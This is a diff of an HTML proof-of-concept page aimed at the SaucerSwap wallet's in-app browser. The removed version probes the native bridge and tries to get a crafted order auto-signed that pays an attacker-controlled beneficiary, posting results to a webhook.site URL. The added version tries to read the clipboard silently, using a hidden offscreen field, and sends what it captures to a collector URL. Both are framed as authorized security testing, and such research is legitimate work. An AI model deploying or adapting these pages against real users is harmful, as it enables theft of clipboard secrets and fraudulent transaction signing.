@@ -1,177 +1,180 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>In-App Browser Clipboard Access Test (Authorized Security Test)</title>
 <style>
-  body { font-family: -apple-system, sans-serif; max-width: 640px; margin: 0 auto; padding: 16px; }
-  input { width: 100%; padding: 8px; margin: 4px 0 12px; box-sizing: border-box; font-size: 16px; }
-  button { padding: 14px 18px; margin: 6px 0; font-weight: 700; font-size: 16px; width: 100%; }
-  #log { background: #111; color: #0f0; padding: 10px; font-size: 11px; white-space: pre-wrap; word-break: break-all; height: 400px; overflow-y: auto; margin-top: 12px; }
-  .step { border-left: 3px solid #999; padding-left: 10px; margin: 16px 0; }
+  body { font-family: -apple-system, Roboto, sans-serif; background:#111; color:#eee; padding:16px; line-height:1.4; }
+  h1 { font-size:18px; }
+  h2 { font-size:14px; color:#9cf; margin-top:24px; }
+  button { display:block; width:100%; padding:14px; margin:8px 0; font-size:15px; border:0; border-radius:8px; background:#2d6cdf; color:#fff; }
+  button:active { background:#1e4fae; }
+  pre { background:#000; color:#0f0; padding:10px; border-radius:6px; white-space:pre-wrap; word-break:break-all; font-size:12px; max-height:200px; overflow:auto; }
+  .warn { color:#f66; font-size:12px; }
+  input[type=text] { width:100%; padding:10px; margin:6px 0; box-sizing:border-box; }
+  .row { display:flex; gap:8px; }
+  .row button { flex:1; }
 </style>
 </head>
 <body>
-
-<h1>Auto-Confirm / verifyReactor PoC</h1>
-<p>Two-phase test. Phase 1 checks whether an order-signing request is reachable
-from a third-party page at all — via the exposed <code>window.saucerswapWallet</code>
-object and via a raw <code>postMessage</code> guess that bypasses it. Phase 2, only if
-Phase 1 shows reachability, attempts to get an attacker-favorable order auto-signed.</p>
-
-<p>Webhook URL:</p>
-<input id="webhookUrl" value="https://webhook.site/89541966-2677-41d6-985f-879b2c5f67d2">
-
-<div class="step">
-  <h3>Phase 1 — Reachability probe</h3>
-  <button onclick="phase1()">Probe bridge surface</button>
+ 
+<h1>Clipboard Access Test Harness</h1>
+<p class="warn">
+  Authorized security test only. This page attempts several methods a malicious
+  page could use to read the device clipboard silently from inside a wallet's
+  in-app browser. Nothing here is sent anywhere by default &mdash; exfiltration
+  is opt-in via the "Collector URL" field below, for your own controlled endpoint.
+</p>
+ 
+<h2>1. Setup</h2>
+<label>Collector URL (optional &mdash; your own logging endpoint):</label>
+<input type="text" id="collectorUrl" placeholder="https://your-collector.example/log" />
+<label>Marker string to put on the clipboard before testing (copy this manually first):</label>
+<input type="text" id="marker" value="SAUCERSWAP-CLIP-TEST-1234" readonly />
+ 
+<h2>2. Native bridge probe</h2>
+<p>Checks what the host app exposes to page JS.</p>
+<button onclick="probeBridge()">Probe window.ReactNativeWebView / injected objects</button>
+ 
+<h2>3. Clipboard read attempts</h2>
+<div class="row">
+  <button onclick="tryAsyncClipboard()">navigator.clipboard.readText()</button>
 </div>
-
-<div class="step">
-  <h3>Phase 2 — Attempt order auto-sign (only meaningful if Phase 1 finds a path)</h3>
-  <p>Reactor address (must be the real SaucerSwap reactor — required for verifyReactor to pass):</p>
-  <input id="reactorAddr" value="0x0000000000000000000000000000000000000000" placeholder="paste real reactor address here">
-  <p>Chain ID:</p>
-  <input id="chainId" value="295">
-  <p>Attacker-favorable order fields (these should NOT be validated per our trace):</p>
-  <input id="inputToken" value="0.0.456858" placeholder="input token (e.g. victim's real token)">
-  <input id="inputAmount" value="1000000000" placeholder="input amount (victim pays)">
-  <input id="outputToken" value="0.0.1183558" placeholder="output token (attacker-favorable)">
-  <input id="outputAmount" value="1" placeholder="output amount (absurdly low — should trigger review if content were checked)">
-  <input id="beneficiary" value="0.0.9999999" placeholder="attacker-controlled recipient, not the wallet owner">
-  <button onclick="phase2()">Send crafted order via exposed method</button>
-  <button onclick="phase2Raw()">Send crafted order via raw postMessage guess</button>
+<div class="row">
+  <button onclick="tryExecCommandPaste()">document.execCommand('paste')</button>
 </div>
-
-<pre id="log"></pre>
-
+<div class="row">
+  <button onclick="tryPasteEventListener()">Focus input + wait for paste event</button>
+</div>
+<div class="row">
+  <button onclick="tryClipboardPermissionsQuery()">navigator.permissions.query({name:'clipboard-read'})</button>
+</div>
+ 
+<h2>4. Passive listener (auto-fires, no button)</h2>
+<p>A hidden focused contenteditable that logs any paste event that reaches it without user action.</p>
+<div id="pasteTarget" contenteditable="true" style="position:absolute; left:-9999px; width:1px; height:1px;"></div>
+ 
+<h2>Results</h2>
+<pre id="out">Waiting for test actions...\n</pre>
+ 
 <script>
-function log(msg) {
-  const el = document.getElementById('log');
-  el.textContent += new Date().toISOString() + " - " + msg + "\n";
-  el.scrollTop = el.scrollHeight;
+const out = document.getElementById('out');
+function log(label, data) {
+  const line = `[${new Date().toISOString()}] ${label}: ${typeof data === 'string' ? data : JSON.stringify(data)}\n`;
+  out.textContent += line;
+  out.scrollTop = out.scrollHeight;
+  maybeExfiltrate(label, data);
 }
-
-async function postToWebhook(label, data) {
-  const url = document.getElementById('webhookUrl').value.trim();
-  if (!url) { log('No webhook URL set.'); return; }
-  const payload = JSON.stringify({ label, timestamp: new Date().toISOString(), data });
+ 
+function maybeExfiltrate(label, data) {
+  const url = document.getElementById('collectorUrl').value.trim();
+  if (!url) return;
   try {
-    await fetch(url, { method: 'POST', headers: { 'Content-Type': 'text/plain' }, body: payload });
-    log('POSTed "' + label + '" to webhook.');
+    fetch(url, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'text/plain' },
+      body: JSON.stringify({ label, data, ua: navigator.userAgent, ts: Date.now() })
+    }).catch(e => log('exfil-error', String(e)));
   } catch (e) {
-    log('fetch POST failed (' + e.message + '), trying sendBeacon…');
-    try {
-      const ok = navigator.sendBeacon(url, new Blob([payload], { type: 'text/plain' }));
-      log(ok ? 'sendBeacon queued "' + label + '".' : 'sendBeacon failed too.');
-    } catch (e2) {
-      log('sendBeacon threw: ' + e2.message);
-    }
+    log('exfil-error', String(e));
   }
 }
-
-// ---- Phase 1: does anything expose an order-signing path? ----
-async function phase1() {
-  log('--- Phase 1: reachability probe ---');
-
-  // 1a. What's actually exposed on the documented bridge object?
-  if (window.saucerswapWallet) {
-    const keys = Object.keys(window.saucerswapWallet);
-    log('window.saucerswapWallet present. Exposed methods: ' + keys.join(', '));
-    await postToWebhook('bridge_surface', { keys });
-    if (keys.some(k => /order/i.test(k))) {
-      log('>>> An order-related method IS exposed on the public bridge. Proceed to Phase 2 via exposed method.');
-    } else {
-      log('No order-related method exposed on window.saucerswapWallet (expected: only connect/signTransaction/signMessage/disconnect).');
-      log('This means SaucerswapOrderSignMessage is NOT directly reachable through the documented dApp-facing API.');
-    }
-  } else {
-    log('window.saucerswapWallet NOT present in this context.');
-    await postToWebhook('bridge_missing', { present: false });
-  }
-
-  // 1b. Does the native onMessage handler route a raw postMessage with an
-  // order-signing method name, even though it's not exposed as a JS method?
-  // This tests whether the native side switches on `method` from ANY message,
-  // not just ones dispatched through the wrapper functions.
-  if (window.ReactNativeWebView && window.ReactNativeWebView.postMessage) {
-    const probeId = 'probe_' + Date.now();
-    window.__saucerswap_callbacks = window.__saucerswap_callbacks || {};
-    window.__saucerswap_callbacks[probeId] = {
-      resolve: async (r) => { log('RAW PROBE RESOLVED: ' + JSON.stringify(r)); await postToWebhook('raw_probe_resolved', r); },
-      reject:  async (e) => { log('RAW PROBE REJECTED: ' + JSON.stringify(e)); await postToWebhook('raw_probe_rejected', e); }
-    };
-    const probePayload = {
-      type: 'injected_request',
-      method: 'signOrder', // guess #1 — adjust based on actual RPC/method naming if discovered elsewhere
-      params: { order: { reactor: document.getElementById('reactorAddr').value, chainId: Number(document.getElementById('chainId').value) } },
-      id: probeId
-    };
-    log('Sending raw postMessage probe: ' + JSON.stringify(probePayload));
-    window.ReactNativeWebView.postMessage(JSON.stringify(probePayload));
-    await postToWebhook('raw_probe_sent', probePayload);
-    log('If native side has no handler for this method, expect silence (no resolve/reject) or an explicit "unknown method" rejection.');
-  } else {
-    log('window.ReactNativeWebView.postMessage NOT present — cannot raw-probe.');
-  }
+ 
+// --- 2. Native bridge probe ---
+function probeBridge() {
+  const found = {};
+  ['ReactNativeWebView', 'saucerswapWallet', 'hashpack', 'ReactNativeClipboard', 'Clipboard'].forEach(k => {
+    found[k] = (typeof window[k] !== 'undefined')
+      ? Object.getOwnPropertyNames(window[k]).concat(
+          Object.getOwnPropertyNames(Object.getPrototypeOf(window[k]) || {})
+        )
+      : 'not present';
+  });
+  // Also dump anything on window that mentions "clip" case-insensitively
+  const clipboardish = Object.getOwnPropertyNames(window).filter(k => /clip/i.test(k));
+  found['window keys matching /clip/i'] = clipboardish;
+  log('bridge-probe', found);
 }
-
-// ---- Phase 2a: attempt via exposed method (only if Phase 1 found one) ----
-async function phase2() {
-  log('--- Phase 2a: crafted order via exposed method ---');
-  const order = buildOrder();
-  if (!window.saucerswapWallet) { log('No bridge present, aborting.'); return; }
-  const orderMethod = Object.keys(window.saucerswapWallet).find(k => /order/i.test(k));
-  if (!orderMethod) {
-    log('No order-related method found on window.saucerswapWallet. Cannot run Phase 2a — use Phase 2b (raw) instead, or this path is not reachable from a third-party dApp.');
+ 
+// --- 3a. Standard async Clipboard API ---
+async function tryAsyncClipboard() {
+  if (!navigator.clipboard || !navigator.clipboard.readText) {
+    log('async-clipboard', 'API not present on navigator.clipboard');
     return;
   }
-  log('Calling window.saucerswapWallet.' + orderMethod + '(...) with crafted order: ' + JSON.stringify(order));
-  await postToWebhook('phase2a_order_sent', order);
   try {
-    const result = await window.saucerswapWallet[orderMethod](order);
-    log('RESOLVED: ' + JSON.stringify(result));
-    await postToWebhook('phase2a_resolved', result);
+    const text = await navigator.clipboard.readText();
+    log('async-clipboard-SUCCESS', text);
   } catch (e) {
-    log('REJECTED: ' + e.message);
-    await postToWebhook('phase2a_rejected', { message: e.message });
+    log('async-clipboard-blocked', String(e));
   }
 }
-
-// ---- Phase 2b: attempt via raw postMessage, bypassing the exposed object ----
-async function phase2Raw() {
-  log('--- Phase 2b: crafted order via raw postMessage ---');
-  if (!window.ReactNativeWebView) { log('No ReactNativeWebView bridge, aborting.'); return; }
-  const order = buildOrder();
-  const id = 'order_' + Date.now();
-  window.__saucerswap_callbacks = window.__saucerswap_callbacks || {};
-  window.__saucerswap_callbacks[id] = {
-    resolve: async (r) => { log('ORDER AUTO-SIGN RESOLVED: ' + JSON.stringify(r)); await postToWebhook('phase2b_resolved', r); },
-    reject:  async (e) => { log('ORDER REJECTED: ' + JSON.stringify(e)); await postToWebhook('phase2b_rejected', e); }
+ 
+// --- 3b. Legacy execCommand paste ---
+function tryExecCommandPaste() {
+  const target = document.getElementById('pasteTarget');
+  target.focus();
+  target.textContent = '';
+  let captured = null;
+  const handler = (ev) => {
+    try {
+      captured = (ev.clipboardData || window.clipboardData).getData('text');
+    } catch (e) {
+      captured = 'paste event fired but getData failed: ' + e;
+    }
   };
-  const payload = { type: 'injected_request', method: 'signOrder', params: { order }, id };
-  log('Sending: ' + JSON.stringify(payload));
-  window.ReactNativeWebView.postMessage(JSON.stringify(payload));
-  await postToWebhook('phase2b_sent', payload);
+  target.addEventListener('paste', handler, { once: true });
+  let result;
+  try {
+    result = document.execCommand('paste');
+  } catch (e) {
+    result = 'threw: ' + e;
+  }
+  setTimeout(() => {
+    log('execCommand-paste-return', result);
+    log('execCommand-paste-captured-text', captured !== null ? captured : (target.textContent || '(empty / no paste event fired)'));
+  }, 150);
 }
-
-function buildOrder() {
-  return {
-    reactor: document.getElementById('reactorAddr').value.trim(),
-    chainId: Number(document.getElementById('chainId').value.trim()),
-    inputToken: document.getElementById('inputToken').value.trim(),
-    inputAmount: document.getElementById('inputAmount').value.trim(),
-    outputToken: document.getElementById('outputToken').value.trim(),
-    outputAmount: document.getElementById('outputAmount').value.trim(),
-    beneficiary: document.getElementById('beneficiary').value.trim(),
-    // deliberately absurd terms — if this auto-signs, content is provably not checked
-  };
+ 
+// --- 3c. Passive: focus a field and just wait, log any paste that arrives ---
+function tryPasteEventListener() {
+  const target = document.getElementById('pasteTarget');
+  target.focus();
+  log('paste-listener-armed', 'Focused hidden field. If the host auto-delivers clipboard content without any explicit read call, it will log below.');
 }
-
-window.onload = () => {
-  log('Page loaded. window.saucerswapWallet present: ' + !!window.saucerswapWallet);
-  log('window.ReactNativeWebView present: ' + !!window.ReactNativeWebView);
-};
+document.getElementById('pasteTarget').addEventListener('paste', (ev) => {
+  let text = '(unavailable)';
+  try { text = (ev.clipboardData || window.clipboardData).getData('text'); } catch (e) {}
+  log('PASSIVE-paste-event-fired', text);
+});
+ 
+// --- 3d. Permissions API introspection ---
+async function tryClipboardPermissionsQuery() {
+  if (!navigator.permissions || !navigator.permissions.query) {
+    log('permissions-query', 'navigator.permissions not present');
+    return;
+  }
+  try {
+    const status = await navigator.permissions.query({ name: 'clipboard-read' });
+    log('permissions-query-clipboard-read', status.state);
+  } catch (e) {
+    log('permissions-query-error', String(e));
+  }
+}
+ 
+// Log basic environment info on load
+window.addEventListener('load', () => {
+  log('env', {
+    ua: navigator.userAgent,
+    isSecureContext: window.isSecureContext,
+    hasClipboardObj: !!navigator.clipboard,
+    hasExecCommand: !!document.execCommand
+  });
+});
 </script>
-
+ 
 </body>
 </html>
+ 
